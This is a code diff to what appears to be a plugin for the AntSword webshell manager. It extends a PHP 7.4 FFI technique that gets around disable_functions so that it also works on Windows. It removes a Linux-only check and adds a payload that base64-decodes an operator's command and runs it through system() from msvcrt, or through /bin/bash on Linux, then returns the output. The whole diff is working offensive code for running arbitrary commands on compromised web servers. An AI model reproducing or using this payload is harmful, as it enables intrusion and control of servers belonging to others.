@@ -30,10 +30,10 @@ class PHP74_FFI extends Base {
   precheck() {
     let self = this;
     let infodata = self.top.infodata;
-    if (infodata.os.toLowerCase() !== "linux") {
-      toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
-      return false;
-    }
+    // if (infodata.os.toLowerCase() !== "linux") {
+    //   toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
+    //   return false;
+    // }
     if (!self.CompVersion("7.4", infodata.ver)) {
       toastr.error(PHP74_FFI_LANG['err']['phpvererr'], LANG_T['error']);
       return false;
@@ -155,21 +155,39 @@ class PHP74_FFI extends Base {
       }
     })
     .then(() => {
-      new antSword.module.terminal(self.top.opt, {
-        exec: (arg = {
-          bin: '/bin/bash',
-          cmd: ''
-        }) => {
-          return {
-            _: `$tmp = tempnam(sys_get_temp_dir(), 'as');
-            $cmd = "${arg['bin']} -c \\\"".@base64_decode("${Buffer.from(arg['cmd']).toString('base64')}")."\\\""." > ".$tmp." 2>&1";
+      if (self.top.infodata.os.toLowerCase().indexOf("windows") > -1) {
+        new antSword.module.terminal(self.top.opt, {
+          exec: (arg = {
+            bin: 'cmd',
+            cmd: ''
+          }) => {
+            return {
+              _: `$tmp = tempnam(sys_get_temp_dir(), 'as');
+$cmd = "${arg['bin']} /c \\\"".@base64_decode("${Buffer.from(arg['cmd']).toString('base64')}")."\\\" > ".$tmp;
+$ffi = FFI::cdef("int system(const char *command);", "msvcrt");
+$ffi->system($cmd);
+echo @file_get_contents($tmp);
+unlink($tmp);`
+            }
+          }
+        });
+      } else {
+        new antSword.module.terminal(self.top.opt, {
+          exec: (arg = {
+            bin: '/bin/bash',
+            cmd: ''
+          }) => {
+            return {
+              _: `$tmp = tempnam(sys_get_temp_dir(), 'as');
+$cmd = "${arg['bin']} -c \\\"".@base64_decode("${Buffer.from(arg['cmd']).toString('base64')}")."\\\""." > ".$tmp." 2>&1";
 $ffi = FFI::cdef("int system(const char *command);");
 $ffi->system($cmd);
 echo @file_get_contents($tmp);
 unlink($tmp);`
+            }
           }
-        }
-      });
+        });
+      }
     })
     .catch(err => {
       toastr.error(`${LANG['error']}: ${err}`, LANG_T['error']);
